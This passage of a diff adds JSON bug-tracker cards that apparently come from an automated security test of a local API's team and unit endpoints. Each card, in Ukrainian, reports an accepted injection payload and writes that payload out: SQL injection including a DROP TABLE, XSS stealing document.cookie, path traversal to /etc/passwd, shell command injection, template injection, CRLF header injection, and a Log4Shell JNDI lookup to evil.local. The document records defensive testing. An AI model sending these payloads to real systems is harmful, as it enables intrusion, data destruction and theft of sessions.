+      "id": "BR-099",
+      "name": "BR-099: Team → SQL_XSS Create team, ітерація 16: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 16 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = <img src=x onerror=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 99,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-100",
+      "name": "BR-100: Team → SQL_XSS Create team, ітерація 17: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 17 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = \"><script>alert(1)</script>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 100,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-101",
+      "name": "BR-101: Team → SQL_XSS Create team, ітерація 18: [NoSQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 18 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = {$ne: null}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 101,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-102",
+      "name": "BR-102: Team → SQL_XSS Create team, ітерація 19: [NoSQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 19 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = [$gt]=`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 102,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-103",
+      "name": "BR-103: Team → SQL_XSS Create team, ітерація 20: [LDAP Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «LDAP Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 20 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = *)(uid=*`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 103,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-104",
+      "name": "BR-104: Team → SQL_XSS Create team, ітерація 21: [Path Traversal] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 21 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ../../../../etc/passwd`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 104,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-105",
+      "name": "BR-105: Team → SQL_XSS Create team, ітерація 22: [Path Traversal] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 22 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ....//....//etc/passwd`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 105,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-106",
+      "name": "BR-106: Team → SQL_XSS Create team, ітерація 23: [Command Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 23 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ; ls -la`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 106,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-107",
+      "name": "BR-107: Team → SQL_XSS Create team, ітерація 24: [Command Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 24 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = | whoami`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 107,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-108",
+      "name": "BR-108: Team → SQL_XSS Create team, ітерація 25: [Template Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 25 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ${7*7}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 108,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-109",
+      "name": "BR-109: Team → SQL_XSS Create team, ітерація 26: [Template Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 26 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = <%= 7*7 %>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 109,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-110",
+      "name": "BR-110: Team → SQL_XSS Create team, ітерація 27: [Log4Shell] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 27 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ${jndi:ldap://evil.local/a}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 110,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-111",
+      "name": "BR-111: Team → SQL_XSS Create team, ітерація 28: [Log4Shell] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 28 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ${jndi:ldap://evil.local/a}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 111,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-112",
+      "name": "BR-112: Team → SQL_XSS Create team, ітерація 29: [CRLF Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 29 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = admin%0d%0aSet-Cookie: x=1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 112,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-113",
+      "name": "BR-113: Team → SQL_XSS Create team, ітерація 30: [CRLF Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 30 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = test%0d%0aX-Injected: true`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 113,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-114",
+      "name": "BR-114: Team → SQL_XSS Create team, ітерація 31: [Null Byte] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Null Byte» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 31 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = member%00`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 114,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-115",
+      "name": "BR-115: Team → SQL_XSS Create team, ітерація 32: [Homoglyph] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Homoglyph» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 32 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = Tеam with Cyrillic look-alikes`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 115,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-116",
+      "name": "BR-116: Team → SQL_XSS Create team, ітерація 33: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 33 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(123 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 116,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-117",
+      "name": "BR-117: Team → SQL_XSS Create team, ітерація 34: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 34 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb...(283 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 117,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-118",
+      "name": "BR-118: Unit → SQL_XSS Create unit, ітерація 1: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 1 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ' OR '1'='1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 118,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-119",
+      "name": "BR-119: Unit → SQL_XSS Create unit, ітерація 2: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 2 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = admin'--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 119,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-120",
+      "name": "BR-120: Unit → SQL_XSS Create unit, ітерація 3: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 3 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = '; DROP TABLE Unit;--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 120,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-121",
+      "name": "BR-121: Unit → SQL_XSS Create unit, ітерація 4: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 4 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ' OR SLEEP(5)--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 121,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-122",
+      "name": "BR-122: Unit → SQL_XSS Create unit, ітерація 5: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 5 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ' UNION SELECT NULL--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 122,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-123",
+      "name": "BR-123: Unit → SQL_XSS Create unit, ітерація 6: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 6 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ' OR '1'='1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 123,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-124",
+      "name": "BR-124: Unit → SQL_XSS Create unit, ітерація 7: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 7 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = '; DROP TABLE Unit;--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 124,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-125",
+      "name": "BR-125: Unit → SQL_XSS Create unit, ітерація 8: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 8 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = ' OR SLEEP(5)--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 125,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-126",
+      "name": "BR-126: Unit → SQL_XSS Create unit, ітерація 9: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 9 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = <script>alert(1)</script>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 126,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-127",
+      "name": "BR-127: Unit → SQL_XSS Create unit, ітерація 10: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 10 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = <img src=x onerror=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 127,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-128",
+      "name": "BR-128: Unit → SQL_XSS Create unit, ітерація 11: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 11 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = <svg onload=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 128,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-129",
+      "name": "BR-129: Unit → SQL_XSS Create unit, ітерація 12: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 12 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = <body onload=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 129,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-130",
+      "name": "BR-130: Unit → SQL_XSS Create unit, ітерація 13: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 13 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = <iframe src=javascript:alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 130,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-131",
+      "name": "BR-131: Unit → SQL_XSS Create unit, ітерація 14: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 14 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = javascript:alert(1)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 131,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-132",
+      "name": "BR-132: Unit → SQL_XSS Create unit, ітерація 15: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 15 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = <script>alert(document.cookie)</script>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 132,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-133",
+      "name": "BR-133: Unit → SQL_XSS Create unit, ітерація 16: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 16 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = <img src=x onerror=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 133,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-134",
+      "name": "BR-134: Unit → SQL_XSS Create unit, ітерація 17: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 17 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = <svg/onload=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 134,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-135",
+      "name": "BR-135: Unit → SQL_XSS Create unit, ітерація 18: [NoSQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 18 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = {$ne: null}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 135,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-136",
+      "name": "BR-136: Unit → SQL_XSS Create unit, ітерація 19: [NoSQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 19 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = [$gt]=`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 136,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-137",
+      "name": "BR-137: Unit → SQL_XSS Create unit, ітерація 20: [LDAP Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «LDAP Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 20 (Unit → SQL_XSS Create unit)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `payload = *)(uid=*`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-10",
+      "pos": 137,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-138",
+      "name": "BR-138: Unit → SQL_XSS Create unit, ітерація 21: [Path Traversal] payload не відхилено",
